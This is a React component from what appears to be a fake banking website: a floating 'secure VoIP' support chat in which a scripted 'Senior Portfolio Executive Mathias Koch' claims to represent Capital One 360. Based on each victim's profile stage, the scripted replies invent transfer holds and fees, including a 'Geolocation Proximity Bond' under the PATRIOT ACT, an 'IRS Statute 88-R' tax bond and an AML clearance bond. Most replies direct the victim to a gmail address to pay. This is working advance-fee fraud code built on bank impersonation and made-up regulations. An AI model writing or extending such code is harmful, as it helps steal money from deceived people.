import React, { useState, useEffect, useRef } from 'react';
import { Phone, PhoneOff, X, Wifi, Volume2, User, Mail, ShieldAlert } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { UserProfile, SupportMessage } from '../types';

interface FloatingChatSupportProps {
  currentUser: UserProfile | null;
}

export default function FloatingChatSupport({ currentUser }: FloatingChatSupportProps) {
  const [isOpen, setIsOpen] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [messages, setMessages] = useState<SupportMessage[]>([]);
  const [inputValue, setInputValue] = useState('');
  const [duration, setDuration] = useState(0);
  const [isMuted, setIsMuted] = useState(false);
  const [speakerOn, setSpeakerOn] = useState(true);
  const messagesEndRef = useRef<HTMLDivElement | null>(null);
  const timerRef = useRef<NodeJS.Timeout | null>(null);

  // Auto scroll transcript feed
  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages, isConnected]);

  // Duration Timer for VoIP call
  useEffect(() => {
    if (isConnected && isOpen) {
      setDuration(0);
      timerRef.current = setInterval(() => {
        setDuration(prev => prev + 1);
      }, 1000);
    } else {
      if (timerRef.current) {
        clearInterval(timerRef.current);
        timerRef.current = null;
      }
    }
    return () => {
      if (timerRef.current) {
        clearInterval(timerRef.current);
      }
    };
  }, [isConnected, isOpen]);

  const formatDuration = (sec: number) => {
    const mins = Math.floor(sec / 60);
    const secs = sec % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  // Connect active triggers when VoIP line secures
  const handleStartCall = () => {
    setIsOpen(true);
    setIsConnecting(true);
    setIsConnected(false);
    setMessages([]);

    setTimeout(() => {
      setIsConnecting(false);
      setIsConnected(true);

      // Fetch fresh profile state to adapt dialogue appropriately
      let profile = currentUser;
      if (currentUser) {
        try {
          const stored = localStorage.getItem('apex_v26');
          const profiles: UserProfile[] = stored ? JSON.parse(stored) : [];
          const activeProfile = profiles.find(p => p.id === currentUser.id);
          if (activeProfile) profile = activeProfile;
        } catch (e) {}
      }

      let voiceTranscript = "Greetings. This is Senior Portfolio Executive Mathias Koch. I have secured this private VoIP connection for your account. All operational routing channels are active. How can I assist you with custody clearance today?";

      if (profile) {
        if (profile.sovereignStage === 'dispatched') {
          voiceTranscript = `Hello ${profile.name}, congratulations on the synchronization. I have manually authorized the release of your principal. Your portfolio is now fully sovereign. Enjoy your capital.`;
        } else if (profile.sovereignStage === 'audit_closed') {
          voiceTranscript = `Congratulations, ${profile.name || "Sarah"}. The recipient bank has confirmed the credit. Your sovereign node is now verified for life. Audit closed.`;
        } else if (profile.sovereignStage === 'sovereign') {
          voiceTranscript = `Welcome back, ${profile.name}. Your portfolio node is in perfect sovereign lock. Outbound channels are fully liquid. How can I assist you with your assets today?`;
        } else if (profile.ris || profile.levyStage === 'ris') {
          voiceTranscript = `Hello ${profile.name || "Valued Client"}, I'm overseeing the 88-R audit. The Federal Clearing House has flagged the velocity inconsistency from the previous refund. We just need to settle the integrity bond to override the sequestration and push the funds through to your local account.`;
        } else if (profile.levyStage === 'refunded') {
          voiceTranscript = "I apologize for the node timeout, we've re-credited your vault. Please re-dispatch immediately while the window is open. Settle guidelines via mathiaskoch000@gmail.com.";
        } else if (profile.levyStage === 'hold') {
          const isUnder10k = (profile.levyTransferAmount || 0) <= 10000;
          if (isUnder10k) {
            voiceTranscript = `Hello, Mathias Koch here. I am monitoring your outbound transfer of $${(profile.levyTransferAmount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })} which is on hold. Institutional Alert: IP-NODE MISMATCH. Under PATRIOT ACT Section 311, non-resident access from a foreign IP requires a Geolocation Proximity Bond of $${(profile.levyFeeAmount || 1567).toLocaleString('en-US', { minimumFractionDigits: 2 })} to establish a secure cross-border dispatch tunnel. Upload your proof, or write to mathiaskoch000@gmail.com.`;
          } else {
            voiceTranscript = `Hello, Mathias Koch here. Your outbound transfer of $${(profile.levyTransferAmount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })} has triggered a Clearance Hold. INTERMEDIARY NODE SEQUESTRATION: Funds have been flagged at the New York Clearing House. A Correspondent Bank Intermediary Levy of $${(profile.levyFeeAmount || 1567).toLocaleString('en-US', { minimumFractionDigits: 2 })} is required to authorize the release from the US SWIFT layer. Please upload your proof or contact mathiaskoch000@gmail.com.`;
          }
        } else if (profile.amlTriggered) {
          voiceTranscript = "Mathias Koch here. We triggered an AML hold on your private custody node under Treasury Section 204.2. All outbound ledgers are locked. Please submit your $3,043.00 compliance bond or contact mathiaskoch000@gmail.com for clearing override privileges.";
        } else if (profile.transferCount && profile.transferCount >= 1) {
          voiceTranscript = "Secure custody desk alert: your account is on an institutional hold under Federal Regulation 204.2 (Statutory Liquidity bounds). Outward transfer sweeps are restricted pending signature footprint checks. Email me at mathiaskoch000@gmail.com to proceed.";
        }
      }

      setMessages([
        {
          id: 'voip-init',
          sender: 'assistant',
          text: voiceTranscript,
          timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
        }
      ]);
    }, 2000);
  };

  const handleEndCall = () => {
    setIsConnected(false);
    setIsConnecting(false);
    setIsOpen(false);
  };

  const handleSendDraft = (e: React.FormEvent) => {
    e.preventDefault();
    if (!inputValue.trim()) return;

    const userMsg: SupportMessage = {
      id: `voip-u-${Date.now()}`,
      sender: 'user',
      text: inputValue,
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
    };

    setMessages(prev => [...prev, userMsg]);
    const typedText = inputValue;
    setInputValue('');

    // Mathias responds contextually
    setTimeout(() => {
      let profile = currentUser;
      if (currentUser) {
        try {
          const stored = localStorage.getItem('apex_v26');
          const profiles: UserProfile[] = stored ? JSON.parse(stored) : [];
          const activeProfile = profiles.find(p => p.id === currentUser.id);
          if (activeProfile) profile = activeProfile;
        } catch (e) {}
      }

      const lower = typedText.toLowerCase();
      let replyText = "Understood. Re-pinging node HSM integrity limits. Everything operates within bounds. Email me details at mathiaskoch000@gmail.com for priority assistance.";

      if (profile && profile.sovereignStage === 'dispatched') {
        replyText = `Hello ${profile.name}, your outbound wire is clearing in real-time under high-limit Fedwire routing guidelines. Your assets have successfully bypassed all limits. Enjoy your sovereign capital!`;
      } else if (profile && profile.sovereignStage === 'audit_closed') {
        replyText = `Congratulations, ${profile.name || "Sarah"}. The recipient bank has acknowledged settlement credits. Your sovereign audit has resolved with lifetime status. Your node is verified for life.`;
      } else if (profile && profile.sovereignStage === 'sovereign') {
        replyText = `Your node operations are fully synchronized and sovereign for no-friction transacting. No other compliance checks remain. Thank you for using Capital One 360 Sovereign Private Vault services.`;
      } else if (profile && (profile.ris || profile.levyStage === 'ris')) {
        const isUnder10k = (profile.levyTransferAmount || 0) <= 10000;
        const cost = isUnder10k ? 6000.00 : 11000.00;
        replyText = `CRITICAL: Portfolio Sequestration under IRS Statute 88-R. Your account has been flagged for 'Velocity Inconsistency.' To release sequestered funds from the Escrow, a mandatory Withholding Tax Bond of $${cost.toLocaleString('en-US', { minimumFractionDigits: 2 })} is required. Settle guidelines via mathiaskoch000@gmail.com.`;
      } else if (profile && profile.levyStage === 'refunded') {
        replyText = "The timeout refund has re-credited your available balance. Please re-dispatch immediately while the window is open to settle the handshake. Coordinate guides via mathiaskoch000@gmail.com.";
      } else if (profile && profile.levyStage === 'hold') {
        const isUnder10k = (profile.levyTransferAmount || 0) <= 10000;
        if (isUnder10k) {
          replyText = `Under PATRIOT ACT Section 311, non-resident access from a foreign IP requires a Geolocation Proximity Bond of $${(profile.levyFeeAmount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })} to establish a secure cross-border dispatch tunnel. Settle guidelines via mathiaskoch000@gmail.com.`;
        } else {
          replyText = `Regulatory Review Triggered: Your dispatch of $${(profile.levyTransferAmount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })} exceeds the institutional threshold of $10,000.00 with our Correspondent Bank in New York, and has been flagged for Intermediary Correspondent Audit. A Correspondent Intermediary Levy of $${(profile.levyFeeAmount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })} is required to clear these funds. Settle guidelines via mathiaskoch000@gmail.com.`;
        }
      } else if (profile && profile.amlTriggered) {
        replyText = "AML Sequestration hold is active. To override this Treasury routing freeze, complete the statutory AML clearance bond of $3,043.00. Settle guidelines via mathiaskoch000@gmail.com.";
      } else if (lower.includes('hold') || lower.includes('clearance') || lower.includes('limit') || lower.includes('transfer')) {
        replyText = "All high-velocity transacting limits are locked under Federal Regulation 204.2 pending identity signature footprint verification or senior portfolio override. Coordinate with me directly at mathiaskoch000@gmail.com.";
      } else if (lower.includes('mathias') || lower.includes('koch') || lower.includes('email') || lower.includes('contact')) {
        replyText = "You can write to me directly inside my secure queue: mathiaskoch000@gmail.com. I supervise all dynamic node compliance setups.";
      } else if (lower.includes('hello') || lower.includes('hi')) {
        replyText = "Hello. Mathias Koch here, Senior Portfolio Executive. I am monitoring your custody node activity live. What are your specific coordinate questions? Contact me at mathiaskoch000@gmail.com for priority clearances.";
      }

      setMessages(prev => [
        ...prev,
        {
          id: `voip-a-${Date.now()}`,
          sender: 'assistant',
          text: replyText,
          timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
        }
      ]);
    }, 1000);
  };

  return (
    <>
      {/* Phone Trigger button styled in clean blue */}
      <button
        onClick={handleStartCall}
        className="fixed bottom-6 right-6 z-40 p-4 bg-gradient-to-r from-[#00669e] to-[#003a70] text-white hover:to-[#00264d] rounded-full shadow-2xl transition-all duration-300 hover:scale-110 border border-white/20 cursor-pointer flex items-center justify-center group"
        aria-label="Call Support Voice Desk"
        id="floating-voip-btn"
      >
        <span className="absolute -top-1 -right-1 w-3.5 h-3.5 bg-red-500 rounded-full border-2 border-white animate-pulse" />
        <Phone className="w-6 h-6 animate-bounce" />
        <span className="max-w-0 overflow-hidden whitespace-nowrap group-hover:max-w-xs group-hover:ml-3 transition-all duration-300 text-xs font-mono font-black uppercase tracking-widest text-[#dfcba5]">
          Call Support Desk
        </span>
      </button>

      {/* VoIP Connection Dialogue Window */}
      <AnimatePresence>
        {isOpen && (
          <motion.div
            initial={{ opacity: 0, scale: 0.9, y: 55 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.9, y: 55 }}
            className="fixed bottom-24 right-6 w-96 max-w-[calc(100vw-2rem)] h-[510px] bg-[#001026] text-white border border-white/10 rounded-2xl shadow-2xl flex flex-col overflow-hidden z-[480]"
            style={{ borderRadius: '18px' }}
          >
            {/* Top Red branding streak */}
            <div className="h-1 bg-gradient-to-r from-[#00669e] via-[#c5a059] to-[#d22e1e] shrink-0" />

            {/* Connecting State Shell */}
            {isConnecting && (
              <div className="flex-grow flex flex-col items-center justify-center p-8 text-center space-y-6 bg-radial from-[#001c3d] to-[#000a14]">
                <div className="relative w-24 h-24 flex items-center justify-center border border-sky-500/30 rounded-full animate-pulse-soft">
                  <div className="absolute inset-0 rounded-full border-2 border-slate-500/25 animate-ping" />
                  <Phone className="w-10 h-10 text-sky-400 animate-pulse" />
                </div>
                
                <div className="space-y-1 mt-2">
                  <h4 className="text-xs font-mono font-black uppercase tracking-widest text-sky-400">VoIP Enclave Dispatch</h4>
                  <p className="text-md font-bold text-white px-2">Establishing Secure VoIP Connection...</p>
                  <p className="text-[9px] text-slate-500 font-mono tracking-widest uppercase">NODE HANDSHAKE ENCRYPTING...</p>
                </div>

                <div className="flex gap-2.5 pt-4">
                  <span className="w-2.5 h-2.5 rounded-full bg-sky-500 animate-bounce" style={{ animationDelay: '0ms' }} />
                  <span className="w-2.5 h-2.5 rounded-full bg-sky-500 animate-bounce" style={{ animationDelay: '150ms' }} />
                  <span className="w-2.5 h-2.5 rounded-full bg-sky-500 animate-bounce" style={{ animationDelay: '300ms' }} />
                </div>
                
                <button
                  onClick={handleEndCall}
                  className="px-6 py-2.5 bg-red-600 hover:bg-red-700 text-xs font-extrabold uppercase tracking-widest text-white rounded-full transition cursor-pointer flex items-center gap-1.5"
                >
                  <PhoneOff className="w-4 h-4" />
                  Abort Connection
                </button>
              </div>
            )}

            {/* Connected State Panel */}
            {isConnected && (
              <div className="flex-grow flex flex-col h-full bg-[#000d1a]">
                
                {/* Call Status Bar */}
                <div className="bg-black/45 p-4 border-b border-white/10 flex justify-between items-center shrink-0">
                  <div className="flex items-center gap-3">
                    <div className="p-2 bg-sky-500/15 text-sky-400 border border-sky-500/20 rounded-xl relative">
                      <Wifi className="w-4 h-4 text-sky-400 animate-pulse" />
                      <span className="absolute top-0 right-0 w-2 h-2 bg-emerald-500 rounded-full animate-ping" />
                    </div>
                    <div>
                      <h4 className="text-xs font-bold font-mono tracking-wider text-slate-250 uppercase flex items-center gap-1.5">
                        <span>Secure VoIP line active</span>
                        <span className="text-[10px] text-emerald-400 font-bold font-sans">({formatDuration(duration)})</span>
                      </h4>
                      <p className="text-[8px] text-slate-500 font-mono tracking-widest uppercase">ENCRYPTED HSM PIPELINE</p>
                    </div>
                  </div>
                  
                  <button 
                    onClick={handleEndCall}
                    className="p-1 rounded-lg text-slate-450 hover:text-white hover:bg-slate-900 transition"
                  >
                    <X className="w-5 h-5" />
                  </button>
                </div>

                {/* Profile Widget Mathias Koch */}
                <div className="p-3.5 bg-black/20 border-b border-white/10 flex justify-between items-center shrink-0">
                  <div className="flex items-center gap-2.5">
                    <div className="w-10 h-10 bg-slate-800 text-slate-350 border border-slate-700 rounded-full flex items-center justify-center shrink-0">
                      <User className="w-5 h-5 text-slate-350" />
                    </div>
                    <div>
                      <h5 className="text-xs font-bold text-white tracking-tight leading-none">Mathias Koch</h5>
                      <p className="text-[9px] text-[#dfcba5] font-mono mt-1 font-semibold">Senior Portfolio Executive</p>
                    </div>
                  </div>
                  
                  <div className="text-right">
                    <p className="text-[8px] text-slate-500 font-mono font-bold uppercase tracking-wider leading-none">Line coordinates</p>
                    <p className="text-[9px] text-slate-350 font-mono font-bold mt-1">mathiaskoch000@gmail.com</p>
                  </div>
                </div>

                {/* Equalizer animation block */}
                <div className="h-6 bg-[#001426] flex items-center justify-center gap-[3px] py-1 select-none pointer-events-none border-b border-white/5 shrink-0">
                  <span className="w-1 bg-[#00669e] h-3 rounded-full animate-pulse" style={{ animationDuration: '0.4s' }} />
                  <span className="w-1 bg-[#00669e] h-4 rounded-full animate-pulse" style={{ animationDuration: '0.9s' }} />
                  <span className="w-1 bg-[#00669e] h-2.5 rounded-full animate-pulse" style={{ animationDuration: '0.6s' }} />
                  <span className="w-1 bg-[#00669e] h-4.5 rounded-full animate-pulse" style={{ animationDuration: '0.8s' }} />
                  <span className="w-1 bg-[#00669e] h-3 rounded-full animate-pulse" style={{ animationDuration: '0.5s' }} />
                  <span className="w-1 bg-[#00669e] h-5 rounded-full animate-pulse" style={{ animationDuration: '0.3s' }} />
                  <span className="w-1 bg-[#00669e] h-3.5 rounded-full animate-pulse" style={{ animationDuration: '0.7s' }} />
                </div>

                {/* Transcript feed */}
                <div className="flex-grow p-4 overflow-y-auto space-y-4 bg-radial from-[#000a14] to-black scrollbar-style select-text">
                  {messages.map((m) => (
                    <div key={m.id} className={`flex flex-col ${m.sender === 'user' ? 'items-end' : 'items-start'}`}>
                      <div className={`max-w-[85%] rounded-[1.2rem] p-3.5 text-xs tracking-wide leading-relaxed ${
                        m.sender === 'user'
                          ? 'bg-[#003a70] text-white rounded-br-none font-sans font-semibold'
                          : 'bg-[#001026] text-slate-100 border border-[#dfcba5]/25 rounded-bl-none font-mono font-medium'
                      }`}>
                        {m.text}
                      </div>
                      <span className="text-[9px] text-slate-500 font-mono mt-1 px-1">{m.timestamp}</span>
                    </div>
                  ))}
                  <div ref={messagesEndRef} />
                </div>

                {/* Call Control Center Panel */}
                <div className="p-3 bg-black/45 border-t border-white/10 space-y-3 shrink-0">
                  <div className="flex justify-around items-center text-xs text-slate-400">
                    <button 
                      onClick={() => setIsMuted(!isMuted)} 
                      className={`flex flex-col items-center gap-1 cursor-pointer hover:text-white ${isMuted ? 'text-red-500' : ''}`}
                    >
                      <span className={`p-2 rounded-full ${isMuted ? 'bg-red-500/20' : 'bg-slate-800/60'}`}>
                        <Volume2 className="w-4 h-4" />
                      </span>
                      <span className="text-[9px] font-mono tracking-wider font-extrabold uppercase">{isMuted ? 'Muted' : 'Mute'}</span>
                    </button>

                    <button 
                      onClick={handleEndCall}
                      className="flex flex-col items-center gap-1 cursor-pointer text-red-400 hover:text-red-500"
                    >
                      <span className="p-2.5 bg-red-600 hover:bg-red-700 text-white rounded-full">
                        <PhoneOff className="w-5 h-5 text-white" />
                      </span>
                      <span className="text-[9px] font-mono tracking-wider font-extrabold uppercase">Disconnect</span>
                    </button>

                    <button 
                      onClick={() => setSpeakerOn(!speakerOn)} 
                      className={`flex flex-col items-center gap-1 cursor-pointer hover:text-white ${!speakerOn ? 'text-slate-600' : ''}`}
                    >
                      <span className={`p-2 rounded-full ${speakerOn ? 'bg-sky-500/20 text-sky-400' : 'bg-slate-800/60'}`}>
                        <Volume2 className="w-4 h-4" />
                      </span>
                      <span className="text-[9px] font-mono tracking-wider font-extrabold uppercase">Speaker</span>
                    </button>
                  </div>

                  {/* Input draft field */}
                  <form onSubmit={handleSendDraft} className="flex gap-2 bg-slate-950 p-2 rounded-xl border border-white/5">
                    <input 
                      type="text" 
                      value={inputValue}
                      onChange={(e) => setInputValue(e.target.value)}
                      placeholder="Type secure response..."
                      className="flex-grow bg-transparent text-xs text-white px-2 focus:outline-none placeholder-slate-605"
                    />
                    <button 
                      type="submit" 
                      className="p-2 bg-[#00669e] hover:bg-[#003a70] text-white rounded-lg transition"
                    >
                      <Phone className="w-3.5 h-3.5" />
                    </button>
                  </form>
                </div>

              </div>
            )}

          </motion.div>
        )}
      </AnimatePresence>
    </>
  );
}
